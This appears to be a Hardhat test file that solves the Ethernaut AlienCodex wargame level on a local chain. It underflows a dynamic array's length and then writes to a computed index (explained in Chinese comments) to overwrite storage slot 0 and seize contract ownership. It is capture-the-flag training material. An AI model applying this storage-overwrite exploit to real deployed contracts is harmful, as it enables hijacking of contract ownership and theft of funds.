const { assert, expect } = require("chai")
const { network, deployments, ethers, getNamedAccounts } = require("hardhat")
const {
    developmentChains,
    networkConfig,
} = require("../../helper-hardhat-config")

const parseEther = ethers.utils.parseEther
const formatEther = ethers.utils.formatEther
const getBalance = ethers.provider.getBalance
const bytes32 = ethers.utils.formatBytes32String

if (!developmentChains.includes(network.name)) {
    describe.skip
} else {
    describe("ethernaut_gatekeeptwo Unit Tests", function () {
        let owner, user1, AlienCodex, AlienCodexAttack
        beforeEach(async () => {
            ;[owner, user1] = await ethers.getSigners()
            const AlienCodexContract = await ethers.getContractFactory(
                "AlienCodex"
            )
            const AlienCodexAttackContract = await ethers.getContractFactory(
                "AlienCodexAttack"
            )
            AlienCodex = await AlienCodexContract.deploy()
            AlienCodexAttack = await AlienCodexAttackContract.deploy()
        })

        describe("break it", () => {
            it("default attack", async function () {
                await AlienCodex.make_contact()
                // const b32 = bytes32("abc")
                // await AlienCodex.record(b32)

                // change length
                await AlienCodex.retract()

                // slot1 save the arrays length
                // let array_s = await ethers.provider.getStorageAt(
                //     AlienCodex.address,
                //     1
                // )

                /* 
                array中元素在storage中slot位置
                keccak256(slot) + index, 此时 codex数组在槽1上 slot=1
                owner在0槽上, 为了让最后的结果变成 0 需要以下条件
                keccak256(slot) + index = 2**256 =>
                index = 2^256 - keccak256(1)
                */
                let index = await AlienCodexAttack.getEleIndex(1)
                let bytes32Addr = await AlienCodexAttack.getBytesAddr(
                    user1.address
                )
                await AlienCodex.revise(index, bytes32Addr)

                // slot1 save the arrays length
                let owner_s = await ethers.provider.getStorageAt(
                    AlienCodex.address,
                    0
                )
                console.log(user1.address)
                console.log(owner_s)
            })
        })
    })
}
